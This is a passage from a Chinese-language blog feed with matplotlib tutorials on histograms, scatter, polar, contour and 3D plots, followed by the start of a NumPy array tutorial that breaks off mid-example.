punctuation">.</span>axhspan<span class="token punctuation">(</span><span class="token number">0.25</span><span class="token punctuation">,</span> <span class="token number">0.75</span><span class="token punctuation">,</span> facecolor<span class="token operator">=</span><span class="token string">'0.5'</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H55809754f09c463ca162d3b92fb7cf22t.png" alt>  </p><h2 id="3-常用；绘图类型"><a href="#3-常用；绘图类型" class="headerlink" title="3 常用；绘图类型"></a>3 常用；绘图类型</h2><h3 id="3-1-直方图"><a href="#3-1-直方图" class="headerlink" title="3.1 直方图"></a>3.1 直方图</h3><p>用numpy随机生成一个符合正态分布的数据集，统计分段区域内数据的个数  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  data <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>normal<span class="token punctuation">(</span><span class="token number">5.0</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  bins <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>data<span class="token punctuation">,</span> bins<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 使用自定义的分段区域  </span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H92698f8c195a4717aeddeab639df7424n.png" alt>  </p><h3 id="3-2-散点图"><a href="#3-2-散点图" class="headerlink" title="3.2 散点图"></a>3.2 散点图</h3><p>使用plot() 绘图时，如果指定样式参数为仅绘制数据点(linesytle=’None’), 那么所绘制的图为一幅散列图。这种方法所绘制的点无法单独指定数据点的颜色和大小，而使用scatter()绘制的散列图可以指定每个点的颜色和大小  </p><p>plt.scatter函数的调用形式如下：  </p><pre class="line-numbers language-python"><code class="language-python">scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> s<span class="token operator">=</span>None<span class="token punctuation">,</span> c<span class="token operator">=</span>None<span class="token punctuation">,</span> marker<span class="token operator">=</span>None<span class="token punctuation">,</span> cmap<span class="token operator">=</span>None<span class="token punctuation">,</span> norm<span class="token operator">=</span>None<span class="token punctuation">,</span> vmin<span class="token operator">=</span>None<span class="token punctuation">,</span> vmax<span class="token operator">=</span>None<span class="token punctuation">,</span> alpha<span class="token operator">=</span>None<span class="token punctuation">,</span> linewidths<span class="token operator">=</span>None<span class="token punctuation">,</span> verts<span class="token operator">=</span>None<span class="token punctuation">,</span> edgecolors<span class="token operator">=</span>None<span class="token punctuation">,</span> data<span class="token operator">=</span>None<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>x ，y</strong>两个参数是数组， 分别指定每个点的X轴和Y轴坐标。  </li><li><strong>s参数</strong>指定点的大小，值和点的面积成正比，它可以是一个数，指定所有点的大小， 也可以是数组分别指定每个点的大小。  </li><li><strong>c参数</strong>指定每个点的颜色，可以是数值或数组。这里使用一维数组为每个点指定一个数值。通过颜色映射表，每个值都会与一个颜色相对应。默认的颜色映射表中蓝色与最小值相对应，红色与最大值对应。当c参数的形状是(N, 3)或(N, 4)的二维数组时则直接表示每个点的RGB颜色。  </li><li><strong>marker参数</strong>设置点的形状，可以是表示形状的字符串，也可以是表示多边形的两个元素的元组， 第一个元素表示多边形的边数，第二个参数表示多边形的样式，取值范围为0、1、2、3。0表示多边形，1表示星形，2表示放射形，3表示忽略边数显示为圆形。  </li><li><strong>alpha参数</strong>设置点的透明度。  </li><li><strong>facecolors参数</strong>为‘none’时表示散列点没有填充色  </li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  x <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>  area <span class="token operator">=</span> np<span class="token punctuation">.</span>pi <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">**</span> <span class="token number">2</span>  color <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> np<span class="token punctuation">.</span>pi <span class="token operator">*</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> s<span class="token operator">=</span>area<span class="token punctuation">,</span> c<span class="token operator">=</span>color<span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>hsv<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/HTB1aeH_baL7gK0jSZFB760ZZpXaQ.png" alt>  </p><h3 id="3-3-梯形图、柱状图、填充图"><a href="#3-3-梯形图、柱状图、填充图" class="headerlink" title="3.3 梯形图、柱状图、填充图"></a>3.3 梯形图、柱状图、填充图</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  n <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.75</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">131</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>step<span class="token punctuation">(</span>n<span class="token punctuation">,</span> n<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 梯形图  </span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>n<span class="token punctuation">,</span> n<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">,</span> align<span class="token operator">=</span><span class="token string">'center'</span><span class="token punctuation">,</span> width<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 柱状图  </span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">133</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>fill_between<span class="token punctuation">(</span>x<span class="token punctuation">,</span> x<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">,</span> x<span class="token operator">**</span><span class="token number">3</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"green"</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 填充图  </span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Hb4e6b9ca81524ed2b56fc7a0c697326e3.png" alt>  </p><h3 id="3-4-对数坐标"><a href="#3-4-对数坐标" class="headerlink" title="3.4 对数坐标"></a>3.4 对数坐标</h3><p>plot()所绘制图表的X-Y轴都是算数坐标。绘制对数坐标图的函数有三个：semilogx()、semilogy()和loglog(),他们分别绘制X轴为对数坐标、Y为对数坐标以及两个轴都为对数坐标时的图表。  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>  y <span class="token operator">=</span> np<span class="token punctuation">.</span>power<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>power<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>semilogy<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'-r'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'--g'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H65269d213e2842e0af8372001bc68e72U.png" alt>  </p><h3 id="3-5-极坐标绘图"><a href="#3-5-极坐标绘图" class="headerlink" title="3.5 极坐标绘图"></a>3.5 极坐标绘图</h3><p>极坐标系和笛卡尔（X-Y）坐标系完全不同的坐标系，极坐标系中的点由一个夹角和一段相对中心点的距离来表示。polar(theta, r, **kwargs)可以直接创建极坐标子图并在其中绘制曲线。也可以使用程序中调用subplot()创建子图时通过polar参数为True，创建一个极坐标子图，然后调用plot()在极坐标中绘图  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  theta <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token number">0.02</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>polar<span class="token punctuation">(</span>theta<span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token operator">*</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">*</span>theta<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>polar<span class="token punctuation">(</span>theta<span class="token punctuation">,</span> <span class="token number">1.8</span><span class="token operator">*</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>theta<span class="token punctuation">)</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'g'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">,</span> polar<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>theta<span class="token punctuation">,</span> <span class="token number">1.4</span><span class="token operator">*</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">*</span>theta<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H847c5401e1cd4641bf3450b1e30113e9m.png" alt>  </p><p><img src="https://ae01.alicdn.com/kf/H9740df43db7d484db16d5e07c2073226r.png" alt>  </p><h2 id="4-2D绘图"><a href="#4-2D绘图" class="headerlink" title="4 2D绘图"></a>4 2D绘图</h2><h3 id="4-1-等值线图"><a href="#4-1-等值线图" class="headerlink" title="4.1 等值线图"></a>4.1 等值线图</h3><p>所谓等值线，是指由函数值相等的各点练成的平滑曲线。等值线可以直观的表示二元函数值的变化趋势，例如等值线密集的地方表示函数值在此处的变化较大。matplotlib中可以使用contour()和contourf()绘制等值线，他们的区别是：contourf()所得到的时带填充效果的等值线  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  y<span class="token punctuation">,</span> x <span class="token operator">=</span> np<span class="token punctuation">.</span>ogrid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">200j</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">300j</span><span class="token punctuation">]</span>  z <span class="token operator">=</span> x <span class="token operator">*</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span> x<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> y<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span>  extent <span class="token operator">=</span> <span class="token punctuation">[</span>np<span class="token punctuation">.</span>min<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>max<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>min<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>max<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">]</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">)</span>  cs <span class="token operator">=</span> plt<span class="token punctuation">.</span>contour<span class="token punctuation">(</span>z <span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> extent<span class="token operator">=</span>extent<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>cool<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>clabel<span class="token punctuation">(</span>cs<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 添加等值线的值  </span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>contourf<span class="token punctuation">(</span>x<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> z<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>hot<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/HTB1DyAbbeP2gK0jSZFo761uIVXaI.png" alt>  </p><ul><li>为了更清楚地区分X轴和Y轴，这里让他们的取证范围和等分次数均不相同。这样得到的数组Z的形状为(200, 300), 他的第0轴对应Y轴， 第1轴对应X轴。  </li><li>调用contour()绘制数组z的等值线图，第二个参数为10，表示将整个函数的取值方位分为10个区间，即显示的等值线图中将有9条等值线图。可以使用extent参数指定等值线图的X轴和Y轴的数据范围。  </li><li>contour()所返回的是一个QuadContourSet对象，将他传给clabel(), 为其中的等值线标上对应的值。  </li><li>调用contourf()，绘制将取值范围分为20份、带填充效果的等值线图。这里演示了另一种设置X,Y轴取值范围的方法，他的前两个参数分别是计算数组z时所使用的X轴Y轴上的取样点，这两个数组必须是一维的。  </li></ul><h3 id="4-2-二维数据的平面色彩显示"><a href="#4-2-二维数据的平面色彩显示" class="headerlink" title="4.2 二维数据的平面色彩显示"></a>4.2 二维数据的平面色彩显示</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  data <span class="token operator">=</span> np<span class="token punctuation">.</span>clip<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">221</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">222</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>data<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>cool<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">223</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>data<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>hot<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>colorbar<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 显示显色对应的数据的指示条  </span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">224</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>data<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>winter<span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>colorbar<span class="token punctuation">(</span>im<span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>winter<span class="token punctuation">,</span> ticks<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Hc61a5a56a733494491306f45d70259f38.png" alt>  </p><h2 id="5-3D绘图"><a href="#5-3D绘图" class="headerlink" title="5 3D绘图"></a>5 3D绘图</h2><p>虽然matplotlib主要专注于绘图，并且主要是二维图形，但它也有一些不同的拓展，能让我们在地理图上绘图，让我们把Excel和3D图表结合起来。在matplotlib的世界里，这样的拓展叫工具包（toolkits）。工具包是一些关注在某个话题（如3D绘图）的特定函数的集合。<br><br>比较流行的工具包由Basemap、GTK工具、Excel工具、Natgrid、AxesGrid和mplot3d。<br><br>mpl_toolkits.mplot3工具包提供了一些基本的3D绘图功能，能支持的图表类型包括散点图(scatter)、曲面图(surf)、线图(line)和网格图(mesh)。虽然mplot3d不是一个最好的绘图库，但他是伴随matplotlib产生的，一次我们对其接口已经很熟悉了。<br><br>下面是一个使用plot_surface绘制3d曲面图的例子<br>  </p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt  <span class="token keyword">import</span> mpl_toolkits<span class="token punctuation">.</span>mplot3d  x<span class="token punctuation">,</span> y <span class="token operator">=</span> np<span class="token punctuation">.</span>mgrid<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">50j</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">50j</span><span class="token punctuation">]</span>  z <span class="token operator">=</span> x<span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>x<span class="token operator">**</span><span class="token number">2</span><span class="token operator">-</span>y<span class="token operator">**</span><span class="token number">2</span><span class="token punctuation">)</span>  ax <span class="token operator">=</span> plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">,</span> projection<span class="token operator">=</span><span class="token string">'3d'</span><span class="token punctuation">)</span>  ax<span class="token punctuation">.</span>plot_surface<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> rstride<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> cstride<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span>plt<span class="token punctuation">.</span>cm<span class="token punctuation">.</span>coolwarm<span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">)</span>  ax<span class="token punctuation">.</span>set_xlabel<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span>  ax<span class="token punctuation">.</span>set_ylabel<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>  ax<span class="token punctuation">.</span>set_zlabel<span class="token punctuation">(</span><span class="token string">'z'</span><span class="token punctuation">)</span>  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/H3f7d30fecda247e2bdbcdef3e5c5c8b8q.png" alt>  </p><p>写个博客不容易，可怜可怜博主，点个广告再走呗(✿◕‿◕✿)。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Numpy</title>
      <link href="/2019/07/22/2019-numpy/"/>
      <url>/2019/07/22/2019-numpy/</url>
      
        <content type="html"><![CDATA[<h1 id="Numpy详解"><a href="#Numpy详解" class="headerlink" title="Numpy详解"></a>Numpy详解</h1><p>ndarray 是多维数组对象， 也是numpy最核心的对象。 在numpy中数组的维度(dimensions)叫做轴(axes), 轴的个数叫做秩(rank). 通常, 夜歌numpy数组的所有元素都是同一类型的数据, 而这些数据的存储和数组的形式无关。  </p><p>下面的例子， 创建了一个三维数组（numpy 导入时 简化为 np）  </p><h2 id="1-数组对象"><a href="#1-数组对象" class="headerlink" title="1 数组对象"></a>1 数组对象</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np  a <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code>[[1 2 3]   [4 5 6]   [7 8 9]]  </code></pre><h3 id="1-1-数据类型"><a href="#1-1-数据类型" class="headerlink" title="1.1 数据类型"></a>1.1 数据类型</h3><p>numpy支持比python原生更多的数据类型，常用数据类型[链接]  </p><h3 id="1-2-创建数组"><a href="#1-2-创建数组" class="headerlink" title="1.2 创建数组"></a>1.2 创建数组</h3><p>通常np.array(), 一维数组:np.arange()或者np.linspace()的方法. np.zeros()、np.ones()、np.eys()则可以创建特殊的数据。np.random.randint()和np.random.random()可以构造随机数数组  </p><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 默认类型为int32  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[1, 2, 3],         [4, 5, 6]])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span>np<span class="token punctuation">.</span>int8<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 指定元素类型为int8  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([[1, 2, 3],         [4, 5, 6]], dtype=int8)  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 默认指定元素为int32  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>array([0, 1, 2, 3, 4])  </code></pre><pre class="line-numbers language-python"><code class="language-python">np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> 